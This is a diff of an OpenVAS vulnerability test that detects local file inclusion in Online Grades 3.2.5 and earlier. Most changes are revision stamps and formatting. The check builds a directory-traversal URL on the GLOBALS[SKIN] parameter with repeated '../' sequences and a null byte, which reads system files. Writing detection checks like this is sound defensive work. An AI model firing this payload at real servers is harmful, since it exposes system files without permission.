@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_online_grades_44399.nasl 5653 2017-03-21 10:19:58Z cfi $
+# $Id: gb_online_grades_44399.nasl 5762 2017-03-29 11:20:04Z cfi $
 #
 # Online Grades Multiple Local File Include Vulnerabilities
 #
@@ -35,21 +35,20 @@ attacks are also possible.
 
 Online Grades 3.2.5 and prior are vulnerable.";
 
-
-if (description)
+if(description)
 {
  script_id(100875);
- script_version("$Revision: 5653 $");
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 11:19:58 +0100 (Tue, 21 Mar 2017) $");
+ script_version("$Revision: 5762 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 13:20:04 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-10-28 13:41:07 +0200 (Thu, 28 Oct 2010)");
  script_bugtraq_id(44399);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_cve_id("CVE-2009-2037");
+ script_cve_id("CVE-2009-2037");
 
  script_name("Online Grades Multiple Local File Include Vulnerabilities");
 
- script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44399");
+ script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/44399");
  script_xref(name : "URL" , value : "http://www.onlinegrades.org/");
 
  script_tag(name:"qod_type", value:"remote_vul");
@@ -66,27 +65,26 @@ if (description)
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/grades","/onlinegrades",cgi_dirs());
 files = traversal_files();
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/grades", "/onlinegrades", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
+
   foreach  file (keys(files)) {
 
-    url = string(dir,"/index.php?GLOBALS[SKIN]=",crap(data:"../",length:3*9),files[file],"%00"); 
+    url = string(dir,"/index.php?GLOBALS[SKIN]=",crap(data:"../",length:3*9),files[file],"%00");
 
-    if(http_vuln_check(port:port,
-		       url:url,pattern:file,extra_check:make_list("Student Login","Student ID"))) {
-     
-      security_message(port:port);
-      exit(0);
-
+    if(http_vuln_check(port:port, url:url,pattern:file,extra_check:make_list("Student Login","Student ID"))) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
-exit(0);
+
+exit( 99 );
